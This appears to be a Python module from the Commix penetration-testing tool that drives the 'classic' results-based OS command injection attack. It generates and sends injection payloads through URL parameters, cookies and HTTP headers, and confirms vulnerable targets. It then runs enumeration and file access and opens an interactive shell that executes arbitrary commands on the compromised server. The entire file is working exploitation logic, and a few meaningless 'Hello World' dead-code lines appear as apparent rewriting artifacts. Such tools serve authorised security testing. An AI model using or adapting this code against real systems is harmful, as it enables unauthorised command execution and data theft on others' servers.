"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2023 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""
import re
import os
import sys
import time
import string
import random
from src.thirdparty.six.moves import input as _input
from src.thirdparty.six.moves import urllib as _urllib
from src.thirdparty.six.moves import html_parser as _html_parser
from src.utils import menu
from src.utils import logs
from src.utils import settings
from src.utils import common
from src.utils import session_handler
from src.thirdparty.colorama import Fore, Back, Style, init
from src.core.shells import reverse_tcp
from src.core.requests import headers
from src.core.requests import requests
from src.core.requests import parameters
from src.core.injections.controller import checks
from src.core.injections.controller import shell_options
from src.core.injections.results_based.techniques.classic import cb_injector
from src.core.injections.results_based.techniques.classic import cb_payloads
from src.core.injections.results_based.techniques.classic import cb_enumeration
from src.core.injections.results_based.techniques.classic import cb_file_access
try:
    import html
    unescape = html.unescape
except:
    unescape = _html_parser.HTMLParser().unescape
'\nThe "classic" technique on result-based OS command injection.\n'
'\nThe "classic" injection technique handler.\n'

def cb_injection_handler(url, timesec, filename, http_request_method, injection_type, technique):
    if False:
        print('Hello World!')
    shell = False
    counter = 1
    vp_flag = True
    no_result = True
    is_encoded = False
    export_injection_info = False
    if not settings.LOAD_SESSION:
        info_msg = 'Testing the ' + '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '. '
        sys.stdout.write(settings.print_info_msg(info_msg))
        sys.stdout.flush()
        if settings.VERBOSITY_LEVEL != 0:
            print(settings.SINGLE_WHITESPACE)
    i = 0
    total = len(settings.WHITESPACES) * len(settings.PREFIXES) * len(settings.SEPARATORS) * len(settings.SUFFIXES)
    for whitespace in settings.WHITESPACES:
        for prefix in settings.PREFIXES:
            for suffix in settings.SUFFIXES:
                for separator in settings.SEPARATORS:
                    if whitespace == settings.SINGLE_WHITESPACE:
                        whitespace = _urllib.parse.quote(whitespace)
                    settings.DETECTION_PHASE = True
                    settings.EXPLOITATION_PHASE = False
                    if settings.LOAD_SESSION and session_handler.notification(url, technique, injection_type):
                        try:
                            settings.CLASSIC_STATE = True
                            (url, technique, injection_type, separator, shell, vuln_parameter, prefix, suffix, TAG, alter_shell, payload, http_request_method, url_time_response, timesec, how_long, output_length, is_vulnerable) = session_handler.injection_point_exportation(url, http_request_method)
                            checks.check_for_stored_tamper(payload)
                        except TypeError:
                            err_msg = "An error occurred while accessing session file ('"
                            err_msg += settings.SESSION_FILE + "'). "
                            err_msg += "Use the '--flush-session' option."
                            print(settings.print_critical_msg(err_msg))
                            raise SystemExit()
                    else:
                        i = i + 1
                        combination = prefix + separator
                        if combination in settings.JUNK_COMBINATION:
                            prefix = ''
                        TAG = ''.join((random.choice(string.ascii_uppercase) for i in range(6)))
                        randv1 = random.randrange(100)
                        randv2 = random.randrange(100)
                        randvcalc = randv1 + randv2
                        alter_shell = menu.options.alter_shell
                        try:
                            if alter_shell:
                                payload = cb_payloads.decision_alter_shell(separator, TAG, randv1, randv2)
                            else:
                                payload = cb_payloads.decision(separator, TAG, randv1, randv2)
                            payload = parameters.prefixes(payload, prefix)
                            payload = parameters.suffixes(payload, suffix)
                            payload = payload.replace(settings.SINGLE_WHITESPACE, whitespace)
                            payload = checks.perform_payload_modification(payload)
                            if settings.VERBOSITY_LEVEL != 0:
                                print(settings.print_payload(payload))
                            if settings.COOKIE_INJECTION == True:
                                vuln_parameter = parameters.specify_cookie_parameter(menu.options.cookie)
                                response = cb_injector.cookie_injection_test(url, vuln_parameter, payload)
                            elif settings.USER_AGENT_INJECTION == True:
                                vuln_parameter = parameters.specify_user_agent_parameter(menu.options.agent)
                                response = cb_injector.user_agent_injection_test(url, vuln_parameter, payload)
                            elif settings.REFERER_INJECTION == True:
                                vuln_parameter = parameters.specify_referer_parameter(menu.options.referer)
                                response = cb_injector.referer_injection_test(url, vuln_parameter, payload)
                            elif settings.HOST_INJECTION == True:
                                vuln_parameter = parameters.specify_host_parameter(menu.options.host)
                                response = cb_injector.host_injection_test(url, vuln_parameter, payload)
                            elif settings.CUSTOM_HEADER_INJECTION == True:
                                vuln_parameter = parameters.specify_custom_header_parameter(settings.INJECT_TAG)
                                response = cb_injector.custom_header_injection_test(url, vuln_parameter, payload)
                            else:
                                (response, vuln_parameter) = cb_injector.injection_test(payload, http_request_method, url)
                            if settings.URL_RELOAD:
                                response = requests.url_reload(url, timesec)
                            time.sleep(timesec)
                            shell = cb_injector.injection_test_results(response, TAG, randvcalc)
                            if settings.VERBOSITY_LEVEL == 0:
                                percent = i * 100 / total
                                float_percent = '{0:.1f}'.format(round(i * 100 / (total * 1.0), 2))
                                if shell == False:
                                    info_msg = 'Testing the ' + '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '...' + ' (' + str(float_percent) + '%)'
                                    sys.stdout.write('\r' + settings.print_info_msg(info_msg))
                                    sys.stdout.flush()
                                if float(float_percent) >= 99.9:
                                    if no_result == True:
                                        percent = settings.FAIL_STATUS
                                    else:
                                        percent = '.. (' + str(float_percent) + '%)'
                                elif len(shell) != 0:
                                    percent = settings.info_msg
                                else:
                                    percent = '.. (' + str(float_percent) + '%)'
                                info_msg = 'Testing the ' + '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '.' + '' + percent + ''
                                sys.stdout.write('\r' + settings.print_info_msg(info_msg))
                                sys.stdout.flush()
                        except (KeyboardInterrupt, SystemExit):
                            print(settings.SINGLE_WHITESPACE)
                            raise
                        except EOFError:
                            if settings.STDIN_PARSING:
                                print(settings.SINGLE_WHITESPACE)
                            err_msg = 'Exiting, due to EOFError.'
                            print(settings.print_error_msg(err_msg))
                            raise
                        except:
                            continue
                    if shell:
                        found = True
                        no_result = False
                        settings.DETECTION_PHASE = False
                        settings.EXPLOITATION_PHASE = True
                        if settings.COOKIE_INJECTION == True:
                            header_name = ' cookie'
                            found_vuln_parameter = vuln_parameter
                            the_type = ' parameter'
                        elif settings.USER_AGENT_INJECTION == True:
                            header_name = ' User-Agent'
                            found_vuln_parameter = ''
                            the_type = ' HTTP header'
                        elif settings.REFERER_INJECTION == True:
                            header_name = ' Referer'
                            found_vuln_parameter = ''
                            the_type = ' HTTP header'
                        elif settings.HOST_INJECTION == True:
                            header_name = ' Host'
                            found_vuln_parameter = ''
                            the_type = ' HTTP header'
                        elif settings.CUSTOM_HEADER_INJECTION == True:
                            header_name = settings.SINGLE_WHITESPACE + settings.CUSTOM_HEADER_NAME
                            found_vuln_parameter = ''
                            the_type = ' HTTP header'
                        else:
                            header_name = ''
                            the_type = ' parameter'
                            if not settings.USER_DEFINED_POST_DATA:
                                found_vuln_parameter = parameters.vuln_GET_param(url)
                            else:
                                found_vuln_parameter = vuln_parameter
                        if len(found_vuln_parameter) != 0:
                            found_vuln_parameter = " '" + found_vuln_parameter + Style.RESET_ALL + Style.BRIGHT + "'"
                        if export_injection_info == False:
                            export_injection_info = logs.add_type_and_technique(export_injection_info, filename, injection_type, technique)
                        if vp_flag == True:
                            vp_flag = logs.add_parameter(vp_flag, filename, the_type, header_name, http_request_method, vuln_parameter, payload)
                        logs.update_payload(filename, counter, payload)
                        counter = counter + 1
                        if not settings.LOAD_SESSION:
                            if settings.VERBOSITY_LEVEL == 0:
                                print(settings.SINGLE_WHITESPACE)
                            else:
                                checks.total_of_requests()
                        info_msg = settings.CHECKING_PARAMETER + ' appears to be injectable via '
                        info_msg += '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '.'
                        print(settings.print_bold_info_msg(info_msg))
                        sub_content = str(checks.url_decode(payload))
                        print(settings.print_sub_content(sub_content))
                        if not settings.LOAD_SESSION:
                            session_handler.injection_point_importation(url, technique, injection_type, separator, shell[0], vuln_parameter, prefix, suffix, TAG, alter_shell, payload, http_request_method, url_time_response=0, timesec=0, how_long=0, output_length=0, is_vulnerable=menu.options.level)
                        else:
                            whitespace = settings.WHITESPACES[0]
                            settings.LOAD_SESSION = False
                        new_line = True
                        if settings.ENUMERATION_DONE == True:
                            while True:
                                message = 'Do you want to ignore stored session and enumerate again? [y/N] > '
                                enumerate_again = common.read_input(message, default='N', check_batch=True)
                                if enumerate_again in settings.CHOICE_YES:
                                    if not menu.options.ignore_session:
                                        menu.options.ignore_session = True
                                    cb_enumeration.do_check(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec)
                                    break
                                elif enumerate_again in settings.CHOICE_NO:
                                    new_line = False
                                    break
                                elif enumerate_again in settings.CHOICE_QUIT:
                                    raise SystemExit()
                                else:
                                    common.invalid_option(enumerate_again)
                                    pass
                        elif menu.enumeration_options():
                            cb_enumeration.do_check(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec)
                        if settings.FILE_ACCESS_DONE == True:
                            while True:
                                message = 'Do you want to ignore stored session and access files again? [y/N] > '
                                file_access_again = common.read_input(message, default='N', check_batch=True)
                                if file_access_again in settings.CHOICE_YES:
                                    if not menu.options.ignore_session:
                                        menu.options.ignore_session = True
                                    cb_file_access.do_check(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec)
                                    break
                                elif file_access_again in settings.CHOICE_NO:
                                    break
                                elif file_access_again in settings.CHOICE_QUIT:
                                    raise SystemExit()
                                else:
                                    common.invalid_option(file_access_again)
                                    pass
                        elif menu.file_access_options():
                            cb_file_access.do_check(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec)
                        if menu.options.os_cmd:
                            cb_enumeration.single_os_cmd_exec(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec)
                        try:
                            checks.alert()
                            go_back = False
                            go_back_again = False
                            while True:
                                if go_back == True:
                                    break
                                message = settings.CHECKING_PARAMETER + ' is vulnerable. Do you want to prompt for a pseudo-terminal shell? [Y/n] > '
                                if settings.CRAWLING:
                                    settings.CRAWLED_URLS_INJECTED.append(_urllib.parse.urlparse(url).netloc)
                                if not settings.STDIN_PARSING:
                                    gotshell = common.read_input(message, default='Y', check_batch=True)
                                else:
                                    gotshell = common.read_input(message, default='n', check_batch=True)
                                if gotshell in settings.CHOICE_YES:
                                    print(settings.OS_SHELL_TITLE)
                                    if settings.READLINE_ERROR:
                                        checks.no_readline_module()
                                    while True:
                                        if not settings.READLINE_ERROR:
                                            checks.tab_autocompleter()
                                        sys.stdout.write(settings.OS_SHELL)
                                        cmd = common.read_input(message='', default='os_shell', check_batch=True)
                                        cmd = checks.escaped_cmd(cmd)
                                        if cmd.lower() in settings.SHELL_OPTIONS:
                                            (go_back, go_back_again) = shell_options.check_option(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, technique, go_back, no_result, timesec, go_back_again, payload, OUTPUT_TEXTFILE='')
                                            if go_back and go_back_again == False:
                                                break
                                            if go_back and go_back_again:
                                                return True
                                        else:
                                            time.sleep(timesec)
                                            response = cb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
                                            if settings.URL_RELOAD:
                                                response = requests.url_reload(url, timesec)
                                            if menu.options.ignore_session or session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None:
                                                try:
                                                    shell = cb_injector.injection_results(response, TAG, cmd)
                                                    shell = ''.join((str(p) for p in shell))
                                                except:
                                                    print(settings.SINGLE_WHITESPACE)
                                                    continue
                                                if not menu.options.ignore_session:
                                                    session_handler.store_cmd(url, cmd, shell, vuln_parameter)
                                            else:
                                                shell = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
                                            if shell or shell != '':
                                                shell = unescape(shell)
                                                logs.executed_command(filename, cmd, shell)
                                                print(settings.command_execution_output(shell))
                                            else:
                                                err_msg = common.invalid_cmd_output(cmd)
                                                print(settings.print_error_msg(err_msg))
                                elif gotshell in settings.CHOICE_NO:
                                    if checks.next_attack_vector(technique, go_back) == True:
                                        break
                                    elif no_result == True:
                                        return False
                                    else:
                                        return True
                                elif gotshell in settings.CHOICE_QUIT:
                                    raise SystemExit()
                                else:
                                    common.invalid_option(gotshell)
                                    pass
                        except (KeyboardInterrupt, SystemExit):
                            raise
                        except EOFError:
                            if settings.STDIN_PARSING:
                                print(settings.SINGLE_WHITESPACE)
                            err_msg = 'Exiting, due to EOFError.'
                            print(settings.print_error_msg(err_msg))
                            raise
    if no_result == True:
        if settings.VERBOSITY_LEVEL == 0:
            print(settings.SINGLE_WHITESPACE)
        return False
    else:
        sys.stdout.write('\r')
        sys.stdout.flush()
'\nThe exploitation function.\n(call the injection handler)\n'

def exploitation(url, timesec, filename, http_request_method, injection_type, technique):
    if False:
        print('Hello World!')
    if cb_injection_handler(url, timesec, filename, http_request_method, injection_type, technique) == False:
        return False